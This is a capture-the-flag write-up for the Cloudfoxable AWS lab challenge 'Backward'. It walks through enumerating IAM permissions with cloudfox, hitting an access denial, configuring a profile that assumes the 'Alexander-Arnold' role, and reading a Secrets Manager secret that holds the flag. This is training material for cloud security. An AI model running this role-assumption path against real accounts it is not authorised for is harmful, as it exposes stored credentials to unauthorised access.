# Cloudfoxable 5 - Backward

## Solution

### Step 1: Identify Who Has Access to the Secret
I needed to identify who had access to a `DomainAdministrator-Credentials-9TWS9X` resource and then retrieve the flag stored in it. 
I started by running the following command to check for any IAM roles or policies with access to the secret:

```bash
cloudfox aws -p cloudfoxable permissions -v2 | grep -i secret
```

The output showed that the "Alexander-Arnold" role had permission to perform the `secretsmanager:GetSecretValue` action on the secret:

```
│ Role │ Alexander-Arnold                │ Managed │ corporate-domain-admin-password-policy │ Allow  │ secretsmanager:GetSecretValue │ arn:aws:secretsmanager:us-west-2:047719646211:secret:DomainAdministrator-Credentials-9TWS9X │ No │
```

### Step 2: Check Access Using the `cloudfoxable` Profile
Next, I attempted to use the `cloudfoxable` profile to retrieve the secret. However, I received an "Access Denied" error, as expected, because the user didn't have the necessary permissions:

```bash
aws --profile cloudfoxable secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-west-2:047719646211:secret:DomainAdministrator-Credentials-9TWS9X
```

**Error Output:**
```
An error occurred (AccessDeniedException) when calling the GetSecretValue operation: User: arn:aws:iam::047719646211:user/ctf-starting-user is not authorized to perform: secretsmanager:GetSecretValue on resource: arn:aws:secretsmanager:us-west-2:047719646211:secret:DomainAdministrator-Credentials-9TWS9X because no identity-based policy allows the secretsmanager:GetSecretValue action
```

### Step 3: Assume the Role "Alexander-Arnold"
Since the "Alexander-Arnold" role had the necessary permission, I configured my AWS CLI to assume that role. I added the following to my `.aws/config` file:

```bash
[profile alexander-arnold]
region = us-west-2
role_arn = arn:aws:iam::047719646211:role/Alexander-Arnold
source_profile = cloudfoxable
```

After saving the changes, I verified that the role assumption worked by running:

```bash
aws --profile alexander-arnold sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AROAQWHCQAQBRYHVXNLAR:botocore-session-1743902759",
    "Account": "047719646211",
    "Arn": "arn:aws:sts::047719646211:assumed-role/Alexander-Arnold/botocore-session-1743902759"
}
```

### Step 4: Retrieve the Secret and Find the Flag
Now that I had successfully assumed the "Alexander-Arnold" role, I used the following command to retrieve the secret:

```bash
aws --profile alexander-arnold secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-west-2:047719646211:secret:DomainAdministrator-Credentials-9TWS9X
```

The output revealed the flag:

```json
{
    "ARN": "arn:aws:secretsmanager:us-west-2:047719646211:secret:DomainAdministrator-Credentials-9TWS9X",
    "Name": "DomainAdministrator-Credentials",
    "VersionId": "6F50E10B-9EA3-427A-AAD8-DEB9D68C5EF7",
    "SecretString": "FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-02-12T09:26:46.917000-05:00"
}
```

### Step 5: Extract the Flag
The flag was found in the `SecretString` field of the JSON output:

```
FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}
```

## Reflection

* **What was your approach?**
  My approach was to first identify the users or roles with access to the secret, then check if I could directly access the secret. After realizing I didn't have sufficient permissions, I assumed the role that had the right permissions and used that to retrieve the secret.

* **What was the biggest challenge?**
  The biggest challenge was the "Access Denied" error when trying to access the secret directly. It required me to think about assuming a role with the necessary permissions.

* **How did you overcome the challenges?**
  I overcame the challenge by reviewing the roles and policies attached to the secret and determining which role had the necessary permissions. I then set up the appropriate profile to assume the role and successfully retrieved the secret.

* **What led to the breakthrough?**
  The breakthrough came when I reviewed the permissions and identified that the "Alexander-Arnold" role had access to the secret. The configuration of my AWS CLI to assume this role allowed me to bypass the access denial.

* **On the blue side, how can the learning be used in future?**
  This experience highlighted the importance of understanding IAM roles, policies, and permissions. In future tasks, I can leverage this knowledge to quickly troubleshoot access issues and assume roles to gain the required permissions when needed. Additionally, it's a reminder to always check the permissions of the resources you're trying to access, rather than simply assuming direct access.